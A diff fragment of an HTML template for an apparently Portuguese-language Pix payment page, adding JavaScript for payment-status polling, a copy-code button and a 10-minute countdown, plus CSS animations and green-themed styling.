+        // In production, check actual payment status
+        fetch(`/check_payment_status/${transactionId}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.success && data.redirect) {
+                    window.location.href = `/resultado/${data.status}`;
+                }
+            })
+            .catch(error => console.error('Error:', error));
+    }
+
+    function copyPixCode() {
+        const pixCode = document.getElementById('pixCode');
+        const copyButtonText = document.getElementById('copyButtonText');
+        const copyIcon = document.getElementById('copyIcon');
+
+        pixCode.select();
+        document.execCommand('copy');
+
+        // Visual feedback
+        copyButtonText.textContent = 'Código copiado';
+        copyIcon.className = 'fas fa-check ml-2';
+
+        setTimeout(() => {
+            copyButtonText.textContent = 'Copiar código';
+            copyIcon.className = 'fas fa-copy ml-2';
+        }, 2000);
+    }
+
+    function startPaymentCountdown() {
+        let minutes = 10;
+        let seconds = 0;
+        const countdownEl = document.getElementById('paymentCountdown');
+        const interval = setInterval(() => {
+            if (seconds === 0) {
+                if (minutes === 0) {
+                    clearInterval(interval);
+                    countdownEl.classList.add('text-red-800');
+                    return;
+                }
+                minutes--;
+                seconds = 59;
+            } else {
+                seconds--;
+            }
+            const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
+            const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
+            countdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+            if (minutes === 0 && seconds <= 30) {
+                countdownEl.classList.add('animate-pulse');
+            }
+        }, 1000);
+    }
+</script>
+
+<style>
+    @keyframes blink {
+        0%, 100% { opacity: 0.8; }
+        50% { opacity: 0.4; }
+    }
+    .blink-animation {
+        animation: blink 2s infinite;
+    }
+    .blink {
+        animation: blink 1s infinite;
+    }
+    .button-3d {
+        box-shadow: 0 4px 0 #9a1c1c;
+        transform: translateY(-2px);
+        transition: all 0.1s;
+    }
+    .button-3d:active {
+        box-shadow: 0 1px 0 #9a1c1c;
+        transform: translateY(0);
+    }
+    .text-shadow {
+        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+    }
+    @keyframes moveLeftRight {
+        0%, 100% { transform: translateX(0); }
+        50% { transform: translateX(10px); }
+    }
+    .animate-left-right {
+        animation: moveLeftRight 1.5s ease-in-out infinite;
+    }
+    .button-3d {
+        transform: translateY(-2px);
+        box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
+        transition: all 0.15s ease;
+    }
+    .button-3d:hover {
+        transform: translateY(-1px);
+        box-shadow: 0 7px 14px rgba(50, 50, 93, 0.1), 0 3px 6px rgba(0, 0, 0, 0.08);
+    }
+    .button-3d:active {
+        transform: translateY(0);
+        box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
+    }
+    .text-shadow {
+        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+    }
+    @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.5; }
+    }
+    .animate-pulse {
+        animation: pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+    .border-military-green {
+        border-color: #126736;
+    }
+    .text-military-green {
+        color: #126736;
+    }
+    .text-military-dark {
+        color: #0c4a29;
+    }
+</style>
+
+{% endblock %}
